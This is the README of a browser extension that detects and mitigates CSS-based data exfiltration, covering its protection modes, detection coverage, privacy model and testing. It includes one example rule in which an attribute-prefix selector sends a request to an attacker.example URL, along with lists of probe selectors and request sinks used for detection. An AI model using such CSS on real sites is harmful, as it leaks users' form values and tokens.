# CSS Sentry

**CSS Sentry** is a browser extension for detecting and reducing risk from CSS-based data exfiltration patterns.

CSS can sometimes do more than style a page. Selectors can probe page state, attributes, form fields, DOM structure, or rendered content, while CSS declarations and at-rules can trigger outbound network requests. When those two capabilities are combined, injected or untrusted CSS can become a browser-side data-leak channel.

CSS Sentry is a clean implementation. It is not a fork of [CSS Exfil Protection](https://github.com/mlgualtieri/CSS-Exfil-Protection/), though it is informed by prior public research, historical browser-extension issues, known bypass classes, browser-platform limitations, and real-world CSS injection / filtering failures.

[![Firefox Addon](docs/firefox-addon-logo.svg)](https://addons.mozilla.org/firefox/addon/css-sentry/)
[![Chrome Extension](docs/chrome-extension-logo.png)](https://chromewebstore.google.com/detail/css-sentry/hkpecdfaeplhonkjjofllbihpjmhngnk)

> [!NOTE]
> This project was built by AI, within a day.

## What CSS Sentry Does

CSS Sentry looks for risky CSS patterns where a stylesheet combines:

1. selector or declaration behavior that can probe page state, attributes, DOM structure, form values, tokens, rendered text, or sensitive UI state; and
2. CSS behavior that can cause the browser to make outbound requests.

In simplified terms:

```text
selector/probe capability + network/output sink + sensitive context = possible CSS exfiltration risk
```

For example, hostile CSS may try to infer sensitive values by using selectors such as:

```css
input[value^="a"] {
  background-image: url("https://attacker.example/leak/a");
}
```

CSS Sentry attempts to detect patterns like this, explain why they are risky, store local findings, and apply bounded mitigation where browser APIs allow it.

## What CSS Sentry Does Not Promise

CSS Sentry is a defense-in-depth tool. It does **not** guarantee complete protection against every CSS-based leak, every browser-side channel, or every future browser/CSS behavior.

It does not claim to prevent:

- every CSS exfiltration technique;
- every CSS injection attack;
- every XS-Leak;
- every browser side channel;
- every future CSS feature abuse;
- malicious JavaScript running in the page;
- compromised websites;
- malicious browser extensions;
- server-side compromise;
- phishing or direct credential theft;
- browser-native parser or rendering-engine bugs;
- every leak inside cross-origin frames or stylesheets that browser extensions cannot inspect.

CSS Sentry reduces exposure to known high-risk CSS exfiltration and rendered-content remote-resource patterns. It should not replace secure application design, output encoding, sanitization, dependency review, least-privilege rendering, or Content Security Policy.

## Why This Exists

Many web applications allow some form of user-controlled or third-party rendered content: themes, markdown, rich text, comments, tickets, helpdesk messages, rendered email, document previews, CMS fields, or imported stylesheet content.

This matters especially when:

- a website allows user-controlled HTML or CSS;
- a custom theme feature allows unsafe CSS;
- untrusted third-party CSS is loaded;
- rendered email or document content includes style rules;
- markdown or rich-text content is rendered into trusted pages;
- comments, tickets, or helpdesk messages are rendered as HTML;
- JavaScript is blocked, but CSS is still allowed;
- sensitive values are reflected into DOM attributes;
- sensitive state can be inferred through selectors, layout, rendered text, or request timing.

Older CSS-exfil extensions demonstrated that browser-side mitigation is possible, but the browser extension platform has changed significantly. Chrome now requires a Manifest V3-first design, and modern browser extensions must be explicit about what they can and cannot inspect or block.

## Browser Support

### Chrome / Chromium

CSS Sentry targets **Manifest V3** on Chrome and Chromium-based browsers.

The Chrome build uses content scripts, DOM and stylesheet scanning, local finding storage, selected `declarativeNetRequest` mitigation, per-site configuration, protection modes, and explicit partial-analysis reporting.

Chrome Manifest V3 does not allow an extension to freely inspect and rewrite every stylesheet response before the page uses it. CSS Sentry is designed around that limitation.

### Firefox

Firefox support uses the same baseline detection engine.

Firefox-specific enhanced behavior may support deeper stylesheet response handling where browser APIs and permissions allow it. Any Firefox-only enhanced behavior is optional, documented separately, and not required for the shared cross-browser baseline.

### Unsupported Platforms

Unless future maintainers explicitly add support, CSS Sentry does not target:

- Chrome Manifest V2;
- XUL extensions;
- Pale Moon;
- Waterfox Classic;
- legacy Firefox versions that lack the required WebExtension APIs.

## Protection Modes

### Passive Mode

Passive mode is detection-only.

CSS Sentry scans CSS, records local findings, shows warnings, and avoids page-changing mitigation. This mode is useful for compatibility testing, review, and understanding what CSS Sentry would report without changing page behavior.

### Balanced Mode

Balanced mode is the recommended general-use mode after the extension is stable.

CSS Sentry detects suspicious CSS, warns on relevant findings, blocks or installs selected mitigation rules for high-confidence remote exfiltration sinks where browser APIs allow it, and lets users review or change protection per site.

Balanced mode is intended to reduce risk while limiting unnecessary site breakage.

### Strict Mode

Strict mode is opt-in and intended for sensitive sites.

Examples include:

- webmail;
- banking;
- identity providers;
- password managers;
- crypto exchanges;
- cloud consoles;
- admin panels;
- CMS dashboards;
- comment moderation pages;
- helpdesk and ticketing systems;
- internal dashboards;
- healthcare or legal portals;
- markdown preview or rendered-document applications.

Strict mode may block suspicious CSS fail-closed, block third-party stylesheets unless allowed, block selected third-party CSS-triggered image/font/resource requests, and warn when a stylesheet or frame cannot be inspected.

Strict mode may break some sites. It is intended for contexts where stronger protection is worth possible compatibility tradeoffs.

## Detection Coverage

CSS Sentry aims to detect risky combinations involving selector probes, declaration-level data probes, CSS network sinks, sensitive contexts, rendered-content behavior, and parser/evasion edge cases.

### Selector and State Probes

Examples include:

- `[value^="..."]`, `[value$="..."]`, `[value*="..."]`, and `[value="..."]` selectors;
- selectors targeting form controls or hidden inputs;
- selectors involving token, session, auth, CSRF, nonce, email, password, secret, key, state, code, or similar attribute names;
- relational selectors such as `:has()`;
- repeated selector patterns that resemble brute-force extraction;
- probing of `data-*`, `aria-*`, `href`, `src`, `name`, or similar attributes when paired with request-capable CSS.

### Declaration-Level Data Probes

CSS Sentry also tracks cases where the sensitive signal is inside declaration values rather than only inside selectors.

Examples include:

- `attr()`-derived values;
- conditional CSS value behavior such as `if()` where represented by supported browser syntax or modeled fixtures;
- style-query and custom-property chains that carry attribute-derived or sensitive values into request-capable declarations;
- nested declaration chains that only become risky after custom-property or fallback resolution.

Declaration-level probes are only actionable when paired with a network-capable sink or another supported high-risk signal.

### Network and Output Sinks

Examples include:

- `background` and `background-image`;
- `border-image` and `border-image-source`;
- `list-style` and `list-style-image`;
- `cursor`;
- URL-capable `content`;
- `mask`, `mask-image`, `-webkit-mask`, and `-webkit-mask-image`;
- `clip-path`;
- `filter`;
- SVG URL references;
- SVG paint/resource references;
- SVG `<style>` blocks in rendered content, including `@import` and remote paint URL sinks;
- `@font-face` remote sources when paired with sensitive selector or side-channel context;
- `@import`;
- `image-set()`;
- remote `url()` references in declarations that can cause browser requests.

### HTML and SVG Resource Attributes

CSS Sentry includes targeted scanning for CSS-adjacent rendered-content resource behavior, including:

- stylesheet links;
- data stylesheet links;
- body background attributes;
- SVG `feImage` references;
- SVG animation/resource references;
- SVG style blocks where CSS can trigger outbound requests.

These checks are scoped to CSS Sentry's browser-observable threat model. JavaScript-only XSS, uploaded-SVG script execution, package-version scanning, server-side sanitizer patching, and browser-engine memory-safety bugs are not CSS Sentry detection features unless they produce CSS-triggered remote-resource behavior within the stated scope.

### Rendered Text and Font Side-Channel Signals

CSS Sentry includes bounded coverage for selected browser-visible rendered-text and font-side-channel patterns when they map to CSS-triggered request behavior.

Examples include:

- conditional remote font usage tied to sensitive selectors;
- `unicode-range` remote font request oracles;
- container-query or keyframe patterns that can trigger remote requests;
- selected rendered-text pseudo-element signals;
- selected text-node and layout signals when the advanced fingerprinting guard is enabled.

CSS Sentry does not inspect font binaries, prove font tables are malicious, or claim complete prevention of every font metric, ligature, text-rendering, or layout side channel.

### Parser and Evasion Cases

CSS Sentry should account for:

- nested grouping rules such as `@media`, `@supports`, `@layer`, and `@container`;
- nested CSS style rules;
- CSS custom properties and `var()` fallback chains;
- comments, whitespace, escapes, and mixed-case CSS tokens;
- misleading remote URL fragments or paths such as strings containing `;base64,`;
- dynamically inserted styles;
- inline `style=""` attributes where feasible;
- same-origin vs cross-origin stylesheet differences;
- same-origin iframe scanning where permissions allow;
- explicit reporting for frames or stylesheets that cannot be inspected;
- large stylesheets where relevant security rules may appear late in the source.

## Analysis Transparency

CSS Sentry avoids implying complete coverage when analysis is partial.

Findings and reports distinguish states such as:

```text
analysis.complete
analysis.partial
stylesheet.pending
stylesheet.cross_origin_uninspectable
stylesheet.failed_permission
stylesheet.failed_csp_or_platform
frame.cross_origin_uninspectable
svg.image_document.uninspectable
analysis.skipped.too_large
analysis.skipped.performance_budget
```

When CSS Sentry cannot fully analyze a stylesheet, frame, SVG image document, or browser-controlled resource path, it reports that limitation clearly.

## Mitigation Model

CSS Sentry uses bounded mitigation rather than broad page rewriting.

Depending on browser support, policy, protection mode, and finding confidence, mitigation may include:

- local reporting only;
- warning the user;
- installing precise `declarativeNetRequest` rules for future matching requests;
- blocking user-configured destination origins;
- applying strict third-party resource policy on sensitive sites;
- applying bounded content neutralization for high-confidence request-capable CSS findings.

CSS Sentry distinguishes already-active blocking from future-request mitigation. It should not claim that a request was blocked merely because a rule was installed after the request already happened.

## Privacy

CSS Sentry is local-first.

By default:

- no telemetry is sent;
- no remote analysis service is used;
- no account is required;
- CSS, URLs, selectors, findings, and page contents are not uploaded;
- findings are stored locally;
- logs can be cleared by the user;
- exported reports are minimized and redacted;
- remote stylesheet fetching from the extension context is not enabled solely for analysis.

If telemetry is ever added, it must be opt-in, minimal, documented, and disabled by default.

If remote stylesheet fetching from the extension context is ever added, it must be opt-in, clearly explained, and compatible with common content blockers.

See [`docs/PRIVACY.md`](./docs/PRIVACY.md) for the detailed privacy model.

## Report Redaction

CSS Sentry stores reports locally, but reports are still minimized before storage and export.

Redaction preserves useful debugging information while avoiding unnecessary exposure of sensitive values. Sensitive selector values, URL credentials, query values, fragments, and token-like path segments are redacted while preserving destination origins, reason codes, severity, and action state.

## Permissions

CSS Sentry requests only the permissions needed for detection and mitigation.

Current permission areas include:

- `storage` for local settings and findings;
- host access so content scripts can scan enabled pages;
- `declarativeNetRequest` for selected Chrome mitigation;
- `webNavigation` for frame and partial-coverage reporting;
- Firefox-specific request handling permissions where enhanced Firefox behavior is supported.

The extension explains permission requests in plain language and degrades clearly when permissions are unavailable or not granted.

Missing permissions or unsupported browser APIs produce clear UI/report states, not noisy console errors or misleading complete-analysis claims.

See [`docs/PERMISSIONS.md`](./docs/PERMISSIONS.md) for the permission rationale.

## Self-Security

CSS Sentry analyzes attacker-influenced CSS, selectors, URLs, frame metadata, and local reports. The extension therefore has its own security boundary.

Implemented self-security controls include:

- runtime-message validation;
- sender validation for privileged extension actions;
- settings import caps and normalization;
- local report size and retention caps;
- DNR status visibility;
- report redaction before storage/export;
- UI rendering without HTML injection or dynamic-code execution sinks;
- bounded content neutralization;
- source and artifact checks for release packaging.

See [`docs/SELF_SECURITY.md`](./docs/SELF_SECURITY.md) for traceability.

## Development and Verification

CSS Sentry uses **pnpm**.

Install dependencies after extracting a fresh package or when dependencies change:

```bash
pnpm install --frozen-lockfile
```

Common verification commands:

```bash
pnpm run compile
pnpm run test
pnpm run test:ai
pnpm run build
pnpm run build:firefox
```

`test:ai` runs Vitest with a JSON reporter and writes `json-report.json` for local diagnostic review.

Full extension verification:

```bash
pnpm run verify:full
```

`verify:full` runs the extension release gate: Chrome and Firefox builds, ZIP generation, generated-manifest verification, release-artifact verification, AI-report config verification, source CSS formatting checks, TypeScript compilation, unit/integration tests, Playwright browser setup, and browser e2e tests.

Development watch commands:

```bash
pnpm run dev
pnpm run dev:firefox
```

Do not use watch mode as the normal way to validate a packaged extension. For clean validation, build the extension and load the generated `.output/` extension directory.

## E2E Setup

Playwright browser binaries are not committed to the repository.

On supported hosts, install Playwright browsers when needed:

```bash
pnpm run setup:e2e:browser
```

Run the e2e suite after building the extension:

```bash
pnpm run build
pnpm run build:firefox
pnpm run test:e2e
```

`test:e2e` runs Playwright directly and does not build automatically.

For a full build plus browser setup plus e2e run:

```bash
pnpm run test:e2e:with-install
```

### Linux Browser Dependencies

Playwright's `install-deps` helper is Debian/Ubuntu oriented. Do not treat it as a cross-distro setup command.

On Arch Linux / Manjaro, prefer the distro Chromium package and point Playwright at it:

```bash
sudo pacman -S --needed chromium
PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH=$(command -v chromium) pnpm run test:e2e
```

For a project-local reminder:

```bash
pnpm run setup:e2e:arch
```

If Playwright reports a missing shared library on Arch, install the Arch package that provides that library rather than using Debian-oriented dependency installation.

## False-Positive Sweep

The false-positive sweep is a development-only audit tool for publication candidates.

```bash
pnpm run build
pnpm run audit:false-positives -- --limit 100
```

The sweep loads the built extension against a seed list of common websites and writes local report summaries under `test-results/false-positive-sweep/`. It is intended to identify noisy Balanced-mode behavior before release.

It is not telemetry, does not send reports anywhere, and is not part of runtime extension behavior.

## Testing and Compatibility

CSS Sentry includes tests for attack and benign cases, including:

- classic CSS exfiltration selectors;
- CSS variables and fallback chains;
- nested rules;
- `:has()`;
- inline styles;
- iframe handling;
- rendered email-like contexts;
- rendered markdown-like contexts;
- nonce/token probes;
- SVG CSS resource behavior;
- parser edge cases;
- high-signal font and rendered-text side-channel patterns;
- benign stylesheets that should not produce actionable findings.

Compatibility testing should include:

- large pages;
- dynamic content;
- iframes;
- embedded-map-like UI;
- webmail themes;
- utility-class output;
- CSS Modules-like output;
- inert markdown code blocks;
- pages altered by other extensions;
- pages with missing host permissions.

CSS Sentry should also be tested alongside common privacy and security extensions, including uBlock Origin, uBlock Origin Lite, NoScript, JShelter, browser tracking protection, and enterprise extension policies where possible.

Fixture coverage is expectation-driven. Every active fixture under `tests/fixtures` should have a matching `.expected.json` file describing expected findings, reason codes, severity, destinations, and block-candidate behavior.

## Historical Issue Coverage

CSS Sentry tracks historical issue classes from earlier CSS-exfil browser-extension work and related sanitizer/rendered-content failures.

Examples include:

- Manifest V3 compatibility;
- brittle substring checks such as treating `[data-value]` like `[value]`;
- unsafe URL classification such as misreading remote URLs containing `;base64,`;
- CSS variable and fallback-chain bypasses;
- nested grouping-rule bypasses;
- first-load and cross-origin stylesheet races;
- missing host-permission errors;
- extension-context network requests that bypass or conflict with blockers;
- high CPU usage on very large pages;
- page breakage from broad mitigation CSS;
- compatibility with NoScript, JShelter, uBlock Origin, and uBlock Origin Lite;
- fixed page-visible markers that make extension detection easier;
- unsupported legacy platforms.

Detailed requirements and status are maintained in [`docs/SPEC.md`](./docs/SPEC.md), [`docs/CVE_SPEC.md`](./docs/CVE_SPEC.md), and [`docs/STATUS.md`](./docs/STATUS.md).

## CVE-Derived Requirements

CVE-derived requirements are maintained in [`docs/CVE_SPEC.md`](./docs/CVE_SPEC.md).

At a high level, `docs/CVE_SPEC.md` tracks requirements for:

- CSS Exfil Protection-specific vulnerability classes;
- CSS variable bypasses;
- nested CSS rule bypasses;
- parser and tokenization edge cases;
- rendered email and helpdesk contexts;
- rendered markdown and rich-text contexts;
- nonce/token/CSRF exfiltration patterns;
- iframe partial-coverage reporting;
- release-time CVE and advisory triage.

The README does not duplicate the CVE tables. Use `docs/CVE_SPEC.md` for detailed CVE/advisory mapping.

## Project Documentation

Project tracking and engineering documents live under [`docs/`](./docs/):

- [`docs/SPEC.md`](./docs/SPEC.md) — product, architecture, policy, UI, browser behavior, and testing requirements.
- [`docs/CVE_SPEC.md`](./docs/CVE_SPEC.md) — CVE-derived requirements, fixtures, advisory triage, and release checklist items.
- [`docs/STATUS.md`](./docs/STATUS.md) — current implementation/testing status, known gaps, release gates, and future/non-goal feature notes.
- [`docs/SECURITY.md`](./docs/SECURITY.md) — supported versions, security report scope, and safe reproduction guidance.
- [`docs/PRIVACY.md`](./docs/PRIVACY.md) — local-first privacy model, report storage, redaction, and telemetry stance.
- [`docs/PERMISSIONS.md`](./docs/PERMISSIONS.md) — browser permission rationale and store-listing guidance.
- [`docs/SELF_SECURITY.md`](./docs/SELF_SECURITY.md) — extension self-security controls and traceability.
- [`docs/RELEASE_CHECKLIST.md`](./docs/RELEASE_CHECKLIST.md) — manual verification, artifact, release-candidate, and stable-release checklist.
- [`docs/RELEASE_NOTES.md`](./docs/RELEASE_NOTES.md) — changelog and release history.
- [`docs/STATUS_WEBSITE.md`](./docs/STATUS_WEBSITE.md) — website/Test Lab status.
- [`docs/website/TEST_LAB_OVERHAUL_PLAN.md`](./docs/website/TEST_LAB_OVERHAUL_PLAN.md) — Test Lab implementation plan.
- [`docs/website/TEST_LAB_COVERAGE_CONTROL.md`](./docs/website/TEST_LAB_COVERAGE_CONTROL.md) — Test Lab coverage-control model.

Use `docs/STATUS.md` as the source of truth for whether a requirement is implemented, partially implemented, not yet tested, or release-ready.

## Website / Test Lab

The repository includes a website package under [`website/`](./website/). The website is a controlled Test Lab for CSS Sentry behavior verification.

The Test Lab uses fake sentinel values and controlled endpoint checks so users can compare:

1. whether the browser made a controlled CSS-triggered request; and
2. whether CSS Sentry reported or mitigated the corresponding behavior.

The Test Lab is not a general security certification. A successful Test Lab result only applies to the explicit test case, browser, extension version, protection mode, and deployment configuration being used.

Website details are documented in [`website/README.md`](./website/README.md) and [`docs/STATUS_WEBSITE.md`](./docs/STATUS_WEBSITE.md).

## Security Reports

Please report bypasses, false negatives, false positives, permission problems, and compatibility problems through the project issue tracker or the documented security disclosure channel.

Useful reports include:

- browser and version;
- extension version;
- protection mode;
- minimal HTML/CSS reproduction;
- expected behavior;
- actual behavior;
- whether other blockers were enabled;
- whether the affected page used iframes, rendered email, rendered markdown, rich text, SVG, third-party stylesheets, or dynamically inserted CSS.

Avoid including real credentials, tokens, private page data, private customer data, or live sensitive URLs in reports.

See [`docs/SECURITY.md`](./docs/SECURITY.md) for the security-reporting policy.

## License

MIT. See [`LICENSE.md`](./LICENSE.md).
